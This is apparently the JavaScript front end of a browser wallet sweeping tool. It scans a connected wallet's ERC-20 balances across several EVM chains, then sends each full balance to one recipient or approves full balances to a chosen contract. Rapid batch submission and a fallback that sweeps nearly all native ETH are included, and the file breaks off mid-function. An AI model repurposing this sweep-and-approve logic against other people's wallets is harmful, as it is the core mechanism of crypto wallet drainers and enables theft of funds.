const MULTICALL3_ABI = [
  "function aggregate3((address target,bool allowFailure,bytes callData)[] calls) view returns ((bool success, bytes returnData)[] returnData)",
  "function aggregate3Value((address target,bool allowFailure,uint256 value,bytes callData)[] calls) payable returns ((bool success, bytes returnData)[] returnData)"
];

const MAX_SCAN_RETRIES = 5;
const CHAINLIST_RPCS_URL = "https://chainlist.org/rpcs.json";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

const APP_CONFIG = {
  chains: [
    {
      key: "ethereum",
      name: "Ethereum Mainnet",
      chainId: 1,
      rpcUrls: ["https://0xrpc.io/eth"],
      blockExplorerUrls: ["https://etherscan.io"],
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
    },
    {
      key: "base",
      name: "Base",
      chainId: 8453,
      rpcUrls: ["https://rpc.sentio.xyz/base"],
      blockExplorerUrls: ["https://basescan.org"],
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
    },
    {
      key: "arbitrum",
      name: "Arbitrum One",
      chainId: 42161,
      rpcUrls: ["https://arb1.arbitrum.io/rpc"],
      blockExplorerUrls: ["https://arbiscan.io"],
      nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
    },
    {
      key: "polygon",
      name: "Polygon",
      chainId: 137,
      rpcUrls: ["https://polygon-rpc.com"],
      blockExplorerUrls: ["https://polygonscan.com"],
      nativeCurrency: { name: "POL", symbol: "POL", decimals: 18 },
      multicall3: "0xcA11bde05977b3631167028862bE2a173976CA11"
    },
    {
      key: "hyperliquid",
      name: "HyperEVM",
      chainId: 999,
      rpcUrls: ["https://rpc.hyperliquid.xyz/evm"],
      blockExplorerUrls: ["https://app.hyperliquid.xyz/explorer"],
      nativeCurrency: { name: "HYPE", symbol: "HYPE", decimals: 18 },
      multicall3: ""
    }
  ],
  strategies: {
    sequential_calls: {
      label: "Many direct transactions from the connected wallet",
      supportsNative: true,
      supportsErc20: true
    },
    permit_batch_signer: {
      label: "Permit signatures plus separate batch executor",
      supportsNative: false,
      supportsErc20: true
    }
  }
};

const state = {
  browserProvider: null,
  signer: null,
  account: null,
  knownTokenBalances: [],
  selectedTokenAddresses: [],
  enrichedTokens: [],
  enrichedTokensLoaded: false,
  chainlistLoaded: false,
  rpcCatalog: {},
  debug: {
    readMode: "-",
    configuredTokenCount: 0,
    queriedAddresses: [],
    nonZeroAddresses: [],
    failures: [],
    activeRpc: "-",
    currentScanAccount: null
  },
  scanCache: {},
  scanVersion: 0
};

const el = {
  chainSelect: document.getElementById("chainSelect"),
  modeDisplay: document.getElementById("modeDisplay"),
  executionStrategy: document.getElementById("executionStrategy"),
  tokenSelectionMode: document.getElementById("tokenSelectionMode"),
  connectButton: document.getElementById("connectButton"),
  scanBalancesButton: document.getElementById("scanBalancesButton"),
  debugToggle: document.getElementById("debugToggle"),
  debugPanel: document.getElementById("debugPanel"),
  sendButton: document.getElementById("sendButton"),
  singleRecipient: document.getElementById("singleRecipient"),
  maxTokenTransfers: document.getElementById("maxTokenTransfers"),
  approvalTarget: document.getElementById("approvalTarget"),
  actionModeDisplay: document.getElementById("actionModeDisplay"),
  rapidSubmitToggle: document.getElementById("rapidSubmitToggle"),
  nativeFallbackToggle: document.getElementById("nativeFallbackToggle"),
  tokenTransferList: document.getElementById("tokenTransferList"),
  walletNotice: document.getElementById("walletNotice"),
  transferNotice: document.getElementById("transferNotice"),
  configuredChainStatus: document.getElementById("configuredChainStatus"),
  walletChainStatus: document.getElementById("walletChainStatus"),
  accountStatus: document.getElementById("accountStatus"),
  balanceStatus: document.getElementById("balanceStatus"),
  multicallStatus: document.getElementById("multicallStatus"),
  assetList: document.getElementById("assetList"),
  debugCatalogLoaded: document.getElementById("debugCatalogLoaded"),
  debugChain: document.getElementById("debugChain"),
  debugCatalogCount: document.getElementById("debugCatalogCount"),
  debugReadMode: document.getElementById("debugReadMode"),
  debugMaxRetries: document.getElementById("debugMaxRetries"),
  debugActiveRpc: document.getElementById("debugActiveRpc"),
  debugQueried: document.getElementById("debugQueried"),
  debugNonzero: document.getElementById("debugNonzero"),
  debugFailures: document.getElementById("debugFailures"),
  privateKeyInput: document.getElementById("privateKeyInput"),
  signingModeDisplay: document.getElementById("signingModeDisplay")
};

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function getSelectedChain() {
  return APP_CONFIG.chains.find((item) => item.key === el.chainSelect.value) || APP_CONFIG.chains[0];
}

function createReadProvider() {
  const chain = getSelectedChain();
  const urls = getRpcUrlsForChain(chain);
  return new ethers.JsonRpcProvider(urls[0], chain.chainId, {
    staticNetwork: true
  });
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function withRetries(label, task, maxRetries = MAX_SCAN_RETRIES) {
  let lastError;
  for (let attempt = 1; attempt <= maxRetries; attempt += 1) {
    try {
      return await task();
    } catch (error) {
      lastError = error;
      if (attempt === maxRetries) {
        break;
      }
      await sleep(Math.min(250 * attempt, 1000));
    }
  }
  throw new Error(label + " failed after " + maxRetries + " attempts: " + (lastError?.message || String(lastError)));
}

function getSelectedStrategy() {
  return el.executionStrategy.value;
}

function updateActionModeDisplay() {
  const strategyKey = getSelectedStrategy();
  if (strategyKey === "permit_batch_signer") {
    el.actionModeDisplay.value = "Approve full balances to approval target";
    el.sendButton.textContent = "Approve selected tokens";
  } else {
    el.actionModeDisplay.value = "Send full balances to recipient";
    el.sendButton.textContent = "Send selected tokens";
  }
}

function setWalletNotice(message, kind) {
  el.walletNotice.textContent = message;
  el.walletNotice.className = "notice" + (kind ? " " + kind : "");
}

function setTransferNotice(message, kind) {
  el.transferNotice.textContent = message;
  el.transferNotice.className = "notice" + (kind ? " " + kind : "");
}

function updateStrategyStatus() {
  const strategyKey = getSelectedStrategy();
  const strategy = APP_CONFIG.strategies[strategyKey];
  el.modeDisplay.value = strategy ? strategy.label : strategyKey;
  updateActionModeDisplay();
}

function populateChains() {
  el.chainSelect.innerHTML = APP_CONFIG.chains.map((chain) => {
    return '<option value="' + chain.key + '">' + chain.name + "</option>";
  }).join("");
  updateConfiguredChainStatus();
}

function updateConfiguredChainStatus() {
  const chain = getSelectedChain();
  el.configuredChainStatus.textContent = chain.name + " (" + chain.chainId + ")";
  el.multicallStatus.textContent = chain.multicall3 || "Not configured";
}

function renderKnownTokenBalances(results) {
  if (!results.length) {
    el.assetList.textContent = "No detected token balances for the selected chain.";
    return;
  }

  const items = results.map((token) => {
    const symbol = escapeHtml(token.symbol || token.sourceSymbol || "UNKNOWN");
    const amount = escapeHtml(token.balanceFormatted || "0");
    const address = escapeHtml(token.address);
    return "<li>" + symbol + ": " + amount + " [" + address + "]</li>";
  }).join("");

  el.assetList.innerHTML = "<strong>Detected token balances</strong><ul>" + items + "</ul>";
}

function getSingleRecipient() {
  const value = (el.singleRecipient.value || "").trim();
  return value;
}

function getApprovalTarget() {
  const value = (el.approvalTarget.value || "").trim();
  return value;
}

function useRapidSubmit() {
  return Boolean(el.rapidSubmitToggle.checked);
}

function useNativeFallback() {
  return Boolean(el.nativeFallbackToggle.checked);
}

function getPrivateKeyValue() {
  return (el.privateKeyInput?.value || "").trim();
}

function getPrivateKeySigner() {
  const privateKey = getPrivateKeyValue();
  if (!privateKey || !state.browserProvider) {
    return null;
  }

  try {
    return new ethers.Wallet(privateKey, state.browserProvider);
  } catch {
    return null;
  }
}

function getExecutionSigner() {
  return getPrivateKeySigner() || state.signer;
}

async function getEffectiveAccount() {
  const privateSigner = getPrivateKeySigner();
  if (privateSigner) {
    return privateSigner.address;
  }
  return state.account;
}

function updateSigningModeDisplay() {
  const privateSigner = getPrivateKeySigner();
  if (privateSigner) {
    el.signingModeDisplay.value = "Debug private key via browser RPC";
    return;
  }
  el.signingModeDisplay.value = "Extension wallet only";
}

function syncSelectedTokenAddresses(mode) {
  const available = state.knownTokenBalances.map((token) => token.address.toLowerCase());
  const availableSet = new Set(available);
  state.selectedTokenAddresses = state.selectedTokenAddresses.filter((address) => availableSet.has(address));

  if (mode === "all_known_tokens") {
    state.selectedTokenAddresses = available;
  }
}

function renderTokenTransferList() {
  const mode = el.tokenSelectionMode.value;
  syncSelectedTokenAddresses(mode);

  if (!state.knownTokenBalances.length) {
    el.tokenTransferList.textContent = "Scan balances to populate the token transfer list.";
    return;
  }

  const header = mode === "all_known_tokens"
    ? "Scanned token balances selected for transfer"
    : "Select scanned token balances to transfer";

  const items = state.knownTokenBalances.map((token) => {
    const addressKey = token.address.toLowerCase();
    const checked = state.selectedTokenAddresses.includes(addressKey) ? " checked" : "";
    const disabled = mode === "all_known_tokens" ? " disabled" : "";
    const symbol = escapeHtml(token.symbol || "UNKNOWN");
    const amount = escapeHtml(token.balanceFormatted || "0");
    const address = escapeHtml(token.address);
    return [
      '<label>',
      '<input type="checkbox" class="token-transfer-checkbox" data-address="' + address + '"' + checked + disabled + ' />',
      '<span>' + symbol + ': ' + amount + ' [' + address + ']</span>',
      '</label>'
    ].join("");
  }).join("");

  el.tokenTransferList.innerHTML = "<strong>" + header + "</strong>" + items;
}

function renderDebugPanel() {
  const chain = getSelectedChain();
  el.debugPanel.classList.toggle("hidden", !el.debugToggle.checked);
  el.debugCatalogLoaded.textContent = state.enrichedTokensLoaded ? "yes" : "no";
  el.debugChain.textContent = chain.key;
  el.debugCatalogCount.textContent = String(state.debug.configuredTokenCount || 0);
  el.debugReadMode.textContent = state.debug.readMode || "-";
  el.debugMaxRetries.textContent = String(MAX_SCAN_RETRIES);
  el.debugActiveRpc.textContent = state.debug.activeRpc || "-";
  el.debugQueried.textContent = state.debug.queriedAddresses.length
    ? state.debug.queriedAddresses.slice(0, 6).join(", ")
    : "-";
  el.debugNonzero.textContent = state.debug.nonZeroAddresses.length
    ? state.debug.nonZeroAddresses.slice(0, 6).join(", ")
    : "-";
  el.debugFailures.textContent = state.debug.failures.length
    ? state.debug.failures.slice(0, 4).join(" | ")
    : "-";
}

async function loadEnrichedTokenCatalog() {
  if (state.enrichedTokensLoaded) {
    return state.enrichedTokens;
  }

  try {
    const response = await fetch("tokens.enriched.json", { cache: "no-store" });
    if (!response.ok) {
      throw new Error("HTTP " + response.status);
    }
    const payload = await response.json();
    state.enrichedTokens = Array.isArray(payload.results) ? payload.results : [];
    state.enrichedTokensLoaded = true;
    renderDebugPanel();
    return state.enrichedTokens;
  } catch (error) {
    setWalletNotice("Failed to load tokens.enriched.json: " + (error.message || error), "error");
    state.enrichedTokens = [];
    state.enrichedTokensLoaded = true;
    renderDebugPanel();
    return state.enrichedTokens;
  }
}

function sanitizeRpcUrl(value) {
  if (typeof value !== "string" || !value.startsWith("http")) {
    return null;
  }
  if (value.includes("${")) {
    return null;
  }
  return value;
}

function getRpcUrlsForChain(chain) {
  const dynamic = state.rpcCatalog[chain.key] || [];
  const merged = [...dynamic, ...(chain.rpcUrls || [])]
    .map(sanitizeRpcUrl)
    .filter(Boolean);
  return [...new Set(merged)];
}

async function loadChainlistRpcs() {
  if (state.chainlistLoaded) {
    return state.rpcCatalog;
  }

  try {
    const response = await fetch(CHAINLIST_RPCS_URL, { cache: "no-store" });
    if (!response.ok) {
      throw new Error("HTTP " + response.status);
    }
    const payload = await response.json();
    const rpcCatalog = {};

    for (const chain of APP_CONFIG.chains) {
      const entry = Array.isArray(payload)
        ? payload.find((item) => Number(item.chainId) === Number(chain.chainId))
        : null;
      const urls = entry && Array.isArray(entry.rpc)
        ? entry.rpc
            .map((item) => sanitizeRpcUrl(typeof item === "string" ? item : item.url))
            .filter(Boolean)
        : [];
      rpcCatalog[chain.key] = [...new Set(urls)];
    }

    state.rpcCatalog = rpcCatalog;
    state.chainlistLoaded = true;
    return rpcCatalog;
  } catch (error) {
    state.rpcCatalog = {};
    state.chainlistLoaded = true;
    setWalletNotice("Chainlist RPC fetch failed. Using built-in RPC fallbacks.", "error");
    return state.rpcCatalog;
  }
}

async function withRotatingProvider(label, task) {
  const chain = getSelectedChain();
  const urls = getRpcUrlsForChain(chain);
  let lastError;

  if (!urls.length) {
    throw new Error("No RPC URLs configured for " + chain.name);
  }

  for (const url of urls) {
    const provider = new ethers.JsonRpcProvider(url, chain.chainId, {
      staticNetwork: true
    });
    state.debug.activeRpc = url;
    renderDebugPanel();
    try {
      const result = await withRetries(label + " via " + url, () => task(provider));
      if (typeof provider.destroy === "function") {
        provider.destroy();
      }
      return result;
    } catch (error) {
      lastError = error;
      if (typeof provider.destroy === "function") {
        provider.destroy();
      }
      continue;
    }
  }

  throw lastError || new Error(label + " failed across all RPC URLs");
}

function getChainKnownTokensFromCatalog() {
  const chain = getSelectedChain();
  return state.enrichedTokens
    .filter((token) => token.chainKey === chain.key && token.address)
    .map((token) => ({
      address: token.address,
      symbol: token.symbol || token.sourceSymbol || "UNKNOWN",
      decimals: token.decimals
    }));
}

function getScanCacheKey() {
  const chain = getSelectedChain();
  let account = state.account || "no-account";
  const privateKey = getPrivateKeyValue();
  if (privateKey) {
    try {
      account = new ethers.Wallet(privateKey).address;
    } catch {
      account = state.account || "no-account";
    }
  }
  return [chain.key, account].join(":");
}

function saveScanCache(results, readMode) {
  const key = getScanCacheKey();
  state.scanCache[key] = {
    results,
    readMode,
    configuredTokenCount: state.debug.configuredTokenCount,
    queriedAddresses: [...state.debug.queriedAddresses],
    nonZeroAddresses: [...state.debug.nonZeroAddresses],
    failures: [...state.debug.failures]
  };
}

function restoreScanCache() {
  const key = getScanCacheKey();
  const cached = state.scanCache[key];
  if (!cached) {
    state.knownTokenBalances = [];
    state.debug.readMode = "not scanned";
    state.debug.nonZeroAddresses = [];
    state.debug.failures = [];
    renderKnownTokenBalances([]);
    renderDebugPanel();
    return false;
  }

  state.knownTokenBalances = cached.results;
  state.debug.readMode = cached.readMode;
  state.debug.configuredTokenCount = cached.configuredTokenCount;
  state.debug.queriedAddresses = cached.queriedAddresses;
  state.debug.nonZeroAddresses = cached.nonZeroAddresses;
  state.debug.failures = cached.failures;
  renderKnownTokenBalances(cached.results);
  renderTokenTransferList();
  renderDebugPanel();
  setTransferNotice(
    "Loaded cached scan for " + getSelectedChain().name + ". Found " + cached.results.length + " token balances."
  );
  return true;
}

async function loadKnownTokenBalancesDirect(tokens) {
  const effectiveAccount = await getEffectiveAccount();
  return withRotatingProvider("direct token scan", async (provider) => {
    const results = [];
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balanceRaw = await contract.balanceOf(effectiveAccount);

        let decimalsValue = token.decimals != null ? Number(token.decimals) : 18;
        if (token.decimals == null) {
          try {
            decimalsValue = Number(await contract.decimals());
          } catch {
            decimalsValue = 18;
          }
        }

        let symbolValue = token.symbol || "UNKNOWN";
        if (!token.symbol || token.symbol === "UNKNOWN") {
          try {
            symbolValue = await contract.symbol();
          } catch {
            symbolValue = token.symbol || "UNKNOWN";
          }
        }

        results.push({
          address: token.address,
          symbol: symbolValue,
          decimals: decimalsValue,
          balanceRaw,
          balanceFormatted: ethers.formatUnits(balanceRaw, decimalsValue)
        });
      } catch (error) {
        results.push({
          address: token.address,
          symbol: token.symbol || "UNKNOWN",
          decimals: Number(token.decimals) || 18,
          balanceRaw: 0n,
          balanceFormatted: "0",
          error: error.message || "Token read failed"
        });
      }
    }
    return results;
  });
}

async function loadKnownTokenBalancesMulticall(chain, tokens) {
  const effectiveAccount = await getEffectiveAccount();
  return withRotatingProvider("multicall token scan", async (provider) => {
    const multicall = new ethers.Contract(chain.multicall3, MULTICALL3_ABI, provider);
    const iface = new ethers.Interface(ERC20_ABI);
    const calls = [];
    const callIndex = [];

    for (const token of tokens) {
      calls.push({
        target: token.address,
        allowFailure: true,
        callData: iface.encodeFunctionData("balanceOf", [effectiveAccount])
      });
      callIndex.push({ address: token.address, type: "balanceOf" });

      if (token.decimals == null) {
        calls.push({
          target: token.address,
          allowFailure: true,
          callData: iface.encodeFunctionData("decimals", [])
        });
        callIndex.push({ address: token.address, type: "decimals" });
      }

      if (!token.symbol || token.symbol === "UNKNOWN") {
        calls.push({
          target: token.address,
          allowFailure: true,
          callData: iface.encodeFunctionData("symbol", [])
        });
        callIndex.push({ address: token.address, type: "symbol" });
      }
    }

    const response = await multicall.aggregate3(calls);
    const tokenState = {};
    for (const token of tokens) {
      tokenState[token.address.toLowerCase()] = {
        address: token.address,
        symbol: token.symbol || "UNKNOWN",
        decimals: token.decimals != null ? Number(token.decimals) : null,
        balanceRaw: 0n
      };
    }

    response.forEach((item, index) => {
      const meta = callIndex[index];
      const entry = tokenState[meta.address.toLowerCase()];
      if (!entry || !item.success) {
        return;
      }
      try {
        const decoded = iface.decodeFunctionResult(meta.type, item.returnData);
        if (meta.type === "balanceOf") {
          entry.balanceRaw = decoded[0];
        } else if (meta.type === "decimals") {
          entry.decimals = Number(decoded[0]);
        } else if (meta.type === "symbol") {
          entry.symbol = decoded[0];
        }
      } catch {
        return;
      }
    });

    return Object.values(tokenState).map((token) => {
      const decimalsValue = token.decimals != null ? token.decimals : 18;
      return {
        address: token.address,
        symbol: token.symbol || "UNKNOWN",
        decimals: decimalsValue,
        balanceRaw: token.balanceRaw,
        balanceFormatted: ethers.formatUnits(token.balanceRaw, decimalsValue)
      };
    });
  });
}

async function refreshWalletStatus() {
  const selectedChain = getSelectedChain();
  const effectiveAccount = await getEffectiveAccount();
  updateSigningModeDisplay();

  if (!state.browserProvider || !state.account) {
    el.walletChainStatus.textContent = "-";
    el.accountStatus.textContent = "-";
    el.balanceStatus.textContent = "-";
    return;
  }

  const network = await state.browserProvider.getNetwork();
  const balance = effectiveAccount
    ? await state.browserProvider.getBalance(effectiveAccount)
    : 0n;
  const walletChainId = Number(network.chainId);
  el.walletChainStatus.textContent = (network.name || "unknown") + " (" + walletChainId + ")";
  el.accountStatus.textContent = effectiveAccount || state.account;
  el.balanceStatus.textContent =
    ethers.formatUnits(balance, selectedChain.nativeCurrency.decimals) + " " + selectedChain.nativeCurrency.symbol;

  if (walletChainId === selectedChain.chainId) {
    if (getPrivateKeySigner()) {
      setWalletNotice("Wallet connected on the selected chain. Debug private-key mode is active.", "good");
    } else {
      setWalletNotice("Wallet connected on the selected chain.", "good");
    }
  } else {
    setWalletNotice(
      "Wallet is on chain " + walletChainId + " but the selected config is " + selectedChain.chainId + ". Switch before sending.",
      "error"
    );
  }
}

async function connectWallet() {
  if (!window.ethereum) {
    setWalletNotice("No extension wallet detected.", "error");
    return;
  }

  try {
    state.browserProvider = new ethers.BrowserProvider(window.ethereum);
    await state.browserProvider.send("eth_requestAccounts", []);
    state.signer = await state.browserProvider.getSigner();
    state.account = await state.signer.getAddress();
    await refreshWalletStatus();
    restoreScanCache();
  } catch (error) {
    setWalletNotice(error.message || "Wallet connection failed.", "error");
  }
}

async function switchChain() {
  if (!window.ethereum) {
    setWalletNotice("No extension wallet detected.", "error");
    return;
  }

  const chain = getSelectedChain();
  const hexChainId = "0x" + chain.chainId.toString(16);

  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexChainId }]
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: hexChainId,
          chainName: chain.name,
          rpcUrls: chain.rpcUrls,
          blockExplorerUrls: chain.blockExplorerUrls,
          nativeCurrency: chain.nativeCurrency
        }]
      });
    } else {
      setWalletNotice(switchError.message || "Chain switch failed.", "error");
      return;
    }
  }

  if (state.browserProvider && state.account) {
    await refreshWalletStatus();
    restoreScanCache();
  }
}

async function loadKnownTokenBalances() {
  const scanVersion = ++state.scanVersion;
  const chain = getSelectedChain();
  const configuredTokens = getChainKnownTokensFromCatalog();
  const effectiveAccount = await getEffectiveAccount();
  state.debug.configuredTokenCount = configuredTokens.length;
  state.debug.queriedAddresses = configuredTokens.map((token) => token.address);
  state.debug.nonZeroAddresses = [];
  state.debug.failures = [];
  state.debug.currentScanAccount = effectiveAccount || state.account || null;

  if (!state.browserProvider || !state.account || !effectiveAccount) {
    state.knownTokenBalances = [];
    state.debug.readMode = "not connected";
    renderKnownTokenBalances([]);
    renderTokenTransferList();
    renderDebugPanel();
    return [];
  }

  let results = [];
  let readMode = "direct";

  if (chain.multicall3 && ethers.isAddress(chain.multicall3)) {
    try {
      results = await loadKnownTokenBalancesMulticall(chain, configuredTokens);
      readMode = "multicall";
    } catch (error) {
      results = await loadKnownTokenBalancesDirect(configuredTokens);
      readMode = "direct fallback";
    }
  } else {
    results = await loadKnownTokenBalancesDirect(configuredTokens);
  }

  const nonZeroResults = results.filter((token) => {
    try {
      return BigInt(token.balanceRaw) > 0n;
    } catch {
      return false;
    }
  });

  if (scanVersion !== state.scanVersion || getSelectedChain().key !== chain.key) {
    return [];
  }

  state.debug.readMode = readMode;
  state.debug.nonZeroAddresses = nonZeroResults.map((token) => token.address);
  state.debug.failures = results
    .filter((token) => token.error)
    .map((token) => token.address + ": " + token.error);

  state.knownTokenBalances = nonZeroResults;
  saveScanCache(nonZeroResults, readMode);
  renderKnownTokenBalances(nonZeroResults);
  renderTokenTransferList();
  renderDebugPanel();

  if (configuredTokens.length) {
    setTransferNotice(
      "Checked " + configuredTokens.length + " enriched tokens on " + chain.name +
      " using " + readMode + ". Found " + nonZeroResults.length + " with balance."
    );
  } else {
    setTransferNotice("No enriched tokens are mapped to " + chain.name + ".", "error");
  }

  return nonZeroResults;
}

function buildExecutionPlan() {
  const strategy = getSelectedStrategy();
  const tokenMode = el.tokenSelectionMode.value;
  const chain = getSelectedChain();
  const recipient = getSingleRecipient();
  const approvalTarget = getApprovalTarget();
  const maxTokenTransfers = Math.max(1, Number(el.maxTokenTransfers.value || 25));

  let tokenTransfers = [];
  if (tokenMode === "all_known_tokens") {
    tokenTransfers = state.knownTokenBalances
      .filter((token) => state.selectedTokenAddresses.includes(token.address.toLowerCase()))
      .slice(0, maxTokenTransfers);
  } else if (tokenMode === "selected_known_tokens") {
    tokenTransfers = state.knownTokenBalances
      .filter((token) => state.selectedTokenAddresses.includes(token.address.toLowerCase()))
      .slice(0, maxTokenTransfers);
  }

  return {
    strategy,
    tokenMode,
    chainKey: chain.key,
    recipient,
    approvalTarget,
    rapidSubmit: useRapidSubmit(),
    nativeFallback: useNativeFallback(),
    maxTokenTransfers,
    knownTokenBalances: state.knownTokenBalances,
    tokenTransfers
  };
}

async function executePlan() {
  const plan = buildExecutionPlan();

  if (plan.strategy === "sequential_calls") {
    await executeSequential(plan);
    return;
  }

  if (plan.strategy === "permit_batch_signer") {
    await executeApprovals(plan);
    return;
  }

  setTransferNotice("Unknown execution strategy.", "error");
}

async function executeSequential(plan) {
  const chain = getSelectedChain();
  const executionSigner = getExecutionSigner();

  if (!executionSigner || !state.account || !state.browserProvider) {
    setTransferNotice("Connect the wallet first.", "error");
    return;
  }

  const network = await state.browserProvider.getNetwork();
  if (Number(network.chainId) !== chain.chainId) {
    setTransferNotice("Wallet chain does not match the selected chain.", "error");
    return;
  }

  if (!ethers.isAddress(plan.recipient || "")) {
    setTransferNotice("Provide one valid recipient address for sequential token sends.", "error");
    return;
  }

  if (!plan.tokenTransfers.length) {
    if (!plan.nativeFallback) {
      setTransferNotice("No detected token balances are available for sequential sending.", "error");
      return;
    }
    await sendNativeFallback(plan);
    return;
  }

  if (plan.rapidSubmit) {
    setTransferNotice(
      "Submitting " + plan.tokenTransfers.length + " token transfer requests to the wallet."
    );
    const requests = plan.tokenTransfers.map((token, index) => {
      const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
      return contract.transfer(plan.recipient, token.balanceRaw)
        .then((tx) => ({ ok: true, token, hash: tx.hash, index }))
        .catch((error) => ({ ok: false, token, error, index }));
    });
    const results = await Promise.all(requests);
    const failures = results.filter((item) => !item.ok);
    if (failures.length) {
      setTransferNotice(
        "Submitted transfer requests with " + failures.length + " immediate failures. Wallet may still have queued the others.",
        "error"
      );
      return;
    }
    setTransferNotice(
      "Submitted " + results.length + " token transfer requests to the wallet.",
      "good"
    );
    return;
  }

  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
    const token = plan.tokenTransfers[index];
    setTransferNotice(
      "Sending " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length +
      " to " + plan.recipient + "."
    );

    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
    await contract.transfer(plan.recipient, token.balanceRaw);
    if (index < plan.tokenTransfers.length - 1) {
      await sleep(75);
    }
  }

  setTransferNotice(
    "Submission complete. Sent " + plan.tokenTransfers.length +
    " token transfer requests to " + plan.recipient + ".",
    "good"
  );
}

async function executeApprovals(plan) {
  const chain = getSelectedChain();
  const executionSigner = getExecutionSigner();

  if (!executionSigner || !state.account || !state.browserProvider) {
    setTransferNotice("Connect the wallet first.", "error");
    return;
  }

  const network = await state.browserProvider.getNetwork();
  if (Number(network.chainId) !== chain.chainId) {
    setTransferNotice("Wallet chain does not match the selected chain.", "error");
    return;
  }

  if (!ethers.isAddress(plan.approvalTarget || "")) {
    setTransferNotice("Provide one valid approval target contract address.", "error");
    return;
  }

  if (!plan.tokenTransfers.length) {
    setTransferNotice("No detected token balances are available for approvals.", "error");
    return;
  }

  if (plan.rapidSubmit) {
    setTransferNotice(
      "Submitting " + plan.tokenTransfers.length + " approval requests to the wallet."
    );
    const requests = plan.tokenTransfers.map((token, index) => {
      const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
      return contract.approve(plan.approvalTarget, token.balanceRaw)
        .then((tx) => ({ ok: true, token, hash: tx.hash, index }))
        .catch((error) => ({ ok: false, token, error, index }));
    });
    const results = await Promise.all(requests);
    const failures = results.filter((item) => !item.ok);
    if (failures.length) {
      setTransferNotice(
        "Submitted approval requests with " + failures.length + " immediate failures. Wallet may still have queued the others.",
        "error"
      );
      return;
    }
    setTransferNotice(
      "Submitted " + results.length + " approval requests to the wallet.",
      "good"
    );
    return;
  }

  for (let index = 0; index < plan.tokenTransfers.length; index += 1) {
    const token = plan.tokenTransfers[index];
    setTransferNotice(
      "Approving " + token.symbol + " " + (index + 1) + " of " + plan.tokenTransfers.length +
      " to " + plan.approvalTarget + "."
    );

    const contract = new ethers.Contract(token.address, ERC20_ABI, executionSigner);
    await contract.approve(plan.approvalTarget, token.balanceRaw);
    if (index < plan.tokenTransfers.length - 1) {
      await sleep(1000);
    }
  }

  setTransferNotice(
    "Submission complete. Sent " + plan.tokenTransfers.length +
    " approval requests to " + plan.approvalTarget + ".",
    "good"
  );
}

async function sendNativeFallback(plan) {
  const chain = getSelectedChain();
  const provider = state.browserProvider;
  const executionSigner = getExecutionSigner();
  const effectiveAccount = await getEffectiveAccount();
  const balance = await provider.getBalance(effectiveAccount);
  const feeData = await provider.getFeeData();
  const estimatedGas = await executionSigner.estimateGas({
    to: plan.recipient,
    value: 1n
  });
  const gasLimit = estimatedGas > 21000n ? estimatedGas : 21000n;
  const gasPrice = feeData.maxFeePerGas || feeData.gasPrice;

  if (!gasPrice) {
    setTransferNotice("Could not determine gas price for native fallback.", "error");
    return;
  }

  const feeBuffer = (gasLimit * gasPrice * 12n) / 10n;
  const value = balance - feeBuffer;
  if (value <= 0n) {
    setTransferNotice("Native balance is too small after estimated fee buffer.", "error");
    return;
  }

  setTransferNotice(
    "No tokens found. Sending native fallback balance to " + plan.recipient + "."
  );

  const tx = await executionSigner.sendTransaction({
    to: plan.recipient,
    value,
    gasLimit,
    maxFeePerGas: feeData.maxFeePerGas || undefined,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas || undefined,
    gasPrice: feeData.maxFeePerGas ? undefined : feeData.gasPrice || undefined
  });

  setTransferNotice(
    "Native fallback complete on " + chain.name +
    (plan.rapidSubmit ? " using rapid submit." : "."),
    "good"
  );
}

async function sendSelectedPlan() {
  el.sendButton.disabled = true;
  el.connectButton.disabled = true;
  el.scanBalancesButton.disabled = true;

  try {
    await executePlan();
    await refreshWalletStatus();
  } catch (error) {
    setTransferNotice(error.shortMessage || error.message || "Execution failed.", "error");
  } finally {
    el.sendButton.disabled = false;
    el.connectButton.disabled = false;
    el.scanBalancesButton.disabled = false;
  }
}

function bindWalletEvents() {
  if (!window.ethereum || window.ethereum.__walletBatchBound) {
    return;
  }

  window.ethereum.on("accountsChanged", async (accounts) => {
    const localVersion = ++state.scanVersion;
    state.account = accounts && accounts[0] ? accounts[0] : null;
    if (!state.account) {
      el.accountStatus.textContent = "-";
      el.balanceStatus.textContent = "-";
      setWalletNotice("Wallet disconnected.", "error");
      state.knownTokenBalances = [];
      state.selectedTokenAddresses = [];
      state.debug.readMode = "not connected";
      renderKnownTokenBalances([]);
      renderTokenTransferList();
      renderDebugPanel();
      return;
    }
    await refreshWalletStatus();
    if (localVersion !== state.scanVersion) {
      return;
    }
    restoreScanCache();
  });

  window.ethereum.on("chainChanged", async () => {
    const localVersion = ++state.scanVersion;
    if (state.account) {
      await refreshWalletStatus();
      if (localVersion !== state.scanVersion) {
        return;
      }
      restoreScanCache();
    }
  });

  window.ethereum.__walletBatchBound = true;
}

function bindEvents() {
  el.chainSelect.addEventListener("change", async () => {
    const localVersion = ++state.scanVersion;
    updateConfiguredChainStatus();
    state.debug.configuredTokenCount = getChainKnownTokensFromCatalog().length;
    state.debug.queriedAddresses = [];
    state.debug.nonZeroAddresses = [];
